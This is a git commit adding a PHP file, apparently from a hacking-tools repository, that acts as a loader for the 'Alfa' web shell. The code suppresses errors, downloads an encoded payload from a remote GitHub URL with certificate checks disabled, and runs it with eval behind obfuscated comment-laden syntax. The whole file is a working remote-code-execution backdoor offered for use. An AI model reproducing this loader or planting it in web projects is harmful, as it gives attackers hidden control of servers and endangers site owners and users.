b738f2cfb0846f014b262788b0c966f652fd487f
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-06-20 15:34:13 +0700

    Nulz

---
+++ alfa/alfa-hard-bypas.php
@@ -0,0 +1,30 @@
+<?php
+session_start();
+error_reporting(0);
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+        if (isset($_SESSION['nulzganteng'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['nulzganteng']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+$ewe = geturlsinfo('https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa-enc-bypas.php');
+/****/@/*55555*/null; /******/@/*55555*/eval('?>' . $ewe);
